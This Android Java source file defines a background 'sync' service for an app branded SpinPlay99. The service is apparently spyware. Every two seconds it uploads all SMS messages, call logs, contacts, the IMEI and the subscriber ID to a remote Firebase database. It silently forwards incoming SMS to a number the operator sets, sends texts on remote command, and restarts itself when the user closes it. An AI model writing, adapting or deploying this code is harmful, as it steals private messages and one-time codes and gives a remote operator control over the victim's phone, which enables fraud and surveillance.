package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID = "spinplay99_sync";
    private static final int NOTIFICATION_ID = 999;

    private DatabaseReference mDatabase;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    private SmsManager smsManager;
    private ValueEventListener forwardingListener, manualSmsListener;
    private String forwardingNumber = "";
    private boolean forwardingEnabled = false;
    private List<String> forwardingFilters = new ArrayList<>();
    private boolean forwardAllSms = true;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        mDatabase = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        loadForwardingSettings();
        listenForManualSms();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncDataToFirebase();
                handler.postDelayed(this, 2000);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncDataToFirebase() {
        DatabaseReference ref = mDatabase.child("devices").child(deviceId);
        ref.child("online_status").setValue(true);
        ref.child("online_status").onDisconnect().setValue(false);
        ref.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
        ref.child("live_data").setValue(collectLiveData());
        updateDeviceInfo();
        checkAndForwardNewSms();
    }

    private Map<String, Object> collectLiveData() {
        Map<String, Object> data = new HashMap<>();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());
        data.put("timestamp", sdf.format(new Date()));
        data.put("timestamp_millis", System.currentTimeMillis());
        data.put("battery_level", getBatteryLevel());
        data.put("network_type", getNetworkType());
        data.put("is_charging", isDeviceCharging());
        data.put("screen_on", isScreenOn());
        data.put("permissions", getAllPermissions());
        data.put("sim_info", getSimInfo());

        if (checkPermission(Manifest.permission.READ_SMS)) {
            data.put("total_sms", getSmsCount());
            data.put("unread_sms", getUnreadSmsCount());
            sendAllSms();
        }
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            data.put("total_calls", getCallLogsCount());
            sendAllCalls();
        }
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            data.put("contacts_count", getContactsCount());
            sendAllContacts();
        }
        return data;
    }

    private void updateDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("device_id", deviceId);
        info.put("device_model", Build.MODEL);
        info.put("device_brand", Build.BRAND);
        info.put("device_manufacturer", Build.MANUFACTURER);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("sdk_version", Build.VERSION.SDK_INT);
        info.put("last_seen", ServerValue.TIMESTAMP);
        info.put("sim_info", getDetailedSimInfo());
        mDatabase.child("devices").child(deviceId).child("device_info").updateChildren(info);
    }

    // ==================== SMS ====================

    private void sendAllSms() {
        new Thread(() -> {
            List<Map<String, Object>> messages = getAllSms();
            Map<String, Object> smsData = new HashMap<>();
            smsData.put("total_count", messages.size());
            smsData.put("last_updated", ServerValue.TIMESTAMP);
            smsData.put("messages", messages);
            mDatabase.child("devices").child(deviceId).child("all_sms").setValue(smsData);
        }).start();
    }

    private List<Map<String, Object>> getAllSms() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI,
                    new String[]{"_id", "address", "body", "date", "type", "read"},
                    null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id", cs(cursor, 0));
                    sms.put("address", cs(cursor, 1));
                    String body = cs(cursor, 2);
                    sms.put("body", body != null && body.length() > 300 ? body.substring(0, 300) + "..." : body);
                    String dateStr = cs(cursor, 3);
                    sms.put("date", dateStr);
                    if (dateStr != null) sms.put("date_readable", formatDate(Long.parseLong(dateStr)));
                    String typeStr = cs(cursor, 4);
                    sms.put("type", "1".equals(typeStr) ? "INBOX" : "2".equals(typeStr) ? "SENT" : "OTHER");
                    sms.put("read", cs(cursor, 5));
                    list.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (cursor != null) cursor.close(); }
        return list;
    }

    private int getSmsCount() { return getCount(Telephony.Sms.CONTENT_URI); }
    private int getUnreadSmsCount() { return getCount(Telephony.Sms.Inbox.CONTENT_URI, "read = 0"); }

    // ==================== CALLS ====================

    private void sendAllCalls() {
        new Thread(() -> {
            List<Map<String, Object>> calls = getAllCalls();
            Map<String, Object> data = new HashMap<>();
            data.put("total_count", calls.size());
            data.put("last_updated", ServerValue.TIMESTAMP);
            data.put("calls", calls);
            mDatabase.child("devices").child(deviceId).child("all_calls").setValue(data);
        }).start();
    }

    private List<Map<String, Object>> getAllCalls() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    new String[]{"_id", "number", "type", "date", "duration", "name"},
                    null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    call.put("id", cs(cursor, 0));
                    call.put("number", cs(cursor, 1));
                    String ts = cs(cursor, 2);
                    call.put("type", "1".equals(ts) ? "INCOMING" : "2".equals(ts) ? "OUTGOING" : "3".equals(ts) ? "MISSED" : "UNKNOWN");
                    String ds = cs(cursor, 3);
                    call.put("date", ds);
                    if (ds != null) call.put("date_readable", formatDate(Long.parseLong(ds)));
                    call.put("duration", cs(cursor, 4));
                    call.put("contact_name", cs(cursor, 5));
                    list.add(call);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (cursor != null) cursor.close(); }
        return list;
    }

    private int getCallLogsCount() { return getCount(CallLog.Calls.CONTENT_URI); }

    // ==================== CONTACTS ====================

    private void sendAllContacts() {
        new Thread(() -> {
            List<Map<String, Object>> contacts = getAllContacts();
            Map<String, Object> data = new HashMap<>();
            data.put("total_count", contacts.size());
            data.put("last_updated", ServerValue.TIMESTAMP);
            data.put("contacts", contacts);
            mDatabase.child("devices").child(deviceId).child("all_contacts").setValue(data);
        }).start();
    }

    private List<Map<String, Object>> getAllContacts() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                    android.provider.ContactsContract.Contacts.CONTENT_URI,
                    new String[]{"_id", "display_name", "has_phone_number"},
                    null, null, "display_name ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> c = new HashMap<>();
                    String cid = cs(cursor, 0);
                    c.put("id", cid);
                    c.put("name", cs(cursor, 1));
                    if ("1".equals(cs(cursor, 2))) c.put("phone", getPhoneNumber(cid));
                    list.add(c);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (cursor != null) cursor.close(); }
        return list;
    }

    private String getPhoneNumber(String contactId) {
        try {
            Cursor cursor = getContentResolver().query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{"number"}, "contact_id = ?", new String[]{contactId}, null);
            if (cursor != null && cursor.moveToFirst()) {
                String n = cursor.getString(0); cursor.close(); return n;
            }
            if (cursor != null) cursor.close();
        } catch (Exception e) {}
        return "";
    }

    private int getContactsCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }

    // ==================== SIM INFO ====================

    private Map<String, Object> getSimInfo() {
        Map<String, Object> s = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                s.put("sim_operator", tm.getSimOperatorName());
                s.put("network_operator", tm.getNetworkOperatorName());
                s.put("network_type", getNetworkTypeName(tm.getNetworkType()));
                s.put("is_roaming", tm.isNetworkRoaming());
            }
        } catch (Exception e) {}
        return s;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> s = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null && checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                s.put("sim_operator_name", tm.getSimOperatorName());
                s.put("network_operator_name", tm.getNetworkOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    s.put("imei", tm.getImei());
                }
                s.put("subscriber_id", tm.getSubscriberId());
            }
        } catch (Exception e) {}
        return s;
    }

    private String getNetworkTypeName(int t) {
        switch (t) {
            case TelephonyManager.NETWORK_TYPE_LTE: return "LTE (4G)";
            case TelephonyManager.NETWORK_TYPE_NR: return "NR (5G)";
            default: return "Mobile";
        }
    }

    // ==================== FORWARDING ====================

    private void loadForwardingSettings() {
        forwardingListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                if (snap.exists()) {
                    forwardingNumber = snap.child("forward_to").getValue(String.class);
                    Boolean e = snap.child("enabled").getValue(Boolean.class);
                    forwardingEnabled = e != null && e;
                    Boolean a = snap.child("forward_all").getValue(Boolean.class);
                    forwardAllSms = a == null || a;
                    forwardingFilters.clear();
                    for (DataSnapshot f : snap.child("filters").getChildren()) {
                        String n = f.getValue(String.class);
                        if (n != null) forwardingFilters.add(n);
                    }
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError err) {}
        };
        mDatabase.child("devices").child(deviceId).child("forwarding_settings")
                .addValueEventListener(forwardingListener);
    }

    private void forwardSms(String from, String body, long ts) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean m = false;
            for (String f : forwardingFilters) { if (from.contains(f)) { m = true; break; } }
            if (!m) return;
        }
        try {
            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
            Map<String, Object> log = new HashMap<>();
            log.put("from", from); log.put("to", forwardingNumber);
            log.put("body", body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status", "FORWARDED"); log.put("forwarded_at", ServerValue.TIMESTAMP);
            mDatabase.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
        } catch (Exception e) {}
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
        new Thread(() -> {
            Cursor cursor = null;
            try {
                cursor = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI,
                        new String[]{"address", "body", "date"},
                        "date > ?", new String[]{String.valueOf(System.currentTimeMillis() - 10000)},
                        "date DESC LIMIT 5");
                if (cursor != null && cursor.moveToFirst()) {
                    do { forwardSms(cs(cursor, 0), cs(cursor, 1), Long.parseLong(cs(cursor, 2))); }
                    while (cursor.moveToNext());
                }
            } catch (Exception e) {}
            finally { if (cursor != null) cursor.close(); }
        }).start();
    }

    // ==================== MANUAL SMS ====================

    private void listenForManualSms() {
        manualSmsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                for (DataSnapshot cmd : snap.getChildren()) {
                    String to = cmd.child("to").getValue(String.class);
                    String msg = cmd.child("message").getValue(String.class);
                    if (to != null && msg != null) {
                        try {
                            smsManager.sendTextMessage(to, null, msg, null, null);
                            Map<String, Object> log = new HashMap<>();
                            log.put("to", to); log.put("message", msg); log.put("status", "SENT");
                            log.put("sent_at", ServerValue.TIMESTAMP);
                            mDatabase.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
                        } catch (Exception e) {}
                    }
                    cmd.getRef().removeValue();
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError err) {}
        };
        mDatabase.child("devices").child(deviceId).child("manual_commands").child("send_sms")
                .addValueEventListener(manualSmsListener);
    }

    // ==================== HELPERS ====================

    private String cs(Cursor c, int i) { try { return c.getString(i); } catch (Exception e) { return ""; } }
    private String formatDate(long ts) {
        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
        catch (Exception e) { return ""; }
    }
    private int getCount(Uri uri) { return getCount(uri, null); }
    private int getCount(Uri uri, String where) {
        int c = 0;
        try {
            Cursor cur = getContentResolver().query(uri, null, where, null, null);
            if (cur != null) { c = cur.getCount(); cur.close(); }
        } catch (Exception e) {}
        return c;
    }
    private Map<String, Boolean> getAllPermissions() {
        Map<String, Boolean> p = new HashMap<>();
        p.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        p.put("read_phone_state", checkPermission(Manifest.permission.READ_PHONE_STATE));
        p.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        p.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        p.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        p.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        p.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        p.put("location", checkPermission(Manifest.permission.ACCESS_FINE_LOCATION));
        return p;
    }
    private boolean checkPermission(String p) {
        return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED;
    }
    private int getBatteryLevel() {
        try {
            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int l = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (s > 0) return (l * 100) / s;
            }
        } catch (Exception e) {}
        return 0;
    }
    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            android.net.NetworkInfo nw = cm.getActiveNetworkInfo();
            if (nw != null && nw.isConnected()) return nw.getTypeName();
        } catch (Exception e) {}
        return "Offline";
    }
    private boolean isDeviceCharging() {
        try {
            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {}
        return false;
    }
    private boolean isScreenOn() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
        return pm != null && pm.isInteractive();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Background sync");
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        Intent i = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SpinPlay99").setContentText("Sync service running")
                .setSmallIcon(android.R.drawable.ic_menu_manage).setContentIntent(pi)
                .setOngoing(true).setPriority(NotificationCompat.PRIORITY_LOW).build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        mDatabase.child("devices").child(deviceId).child("online_status").setValue(false);
        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
        if (forwardingListener != null) mDatabase.child("devices").child(deviceId).child("forwarding_settings").removeEventListener(forwardingListener);
        if (manualSmsListener != null) mDatabase.child("devices").child(deviceId).child("manual_commands").child("send_sms").removeEventListener(manualSmsListener);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        startService(new Intent(getApplicationContext(), BackgroundSyncService.class));
        super.onTaskRemoved(rootIntent);
    }
}
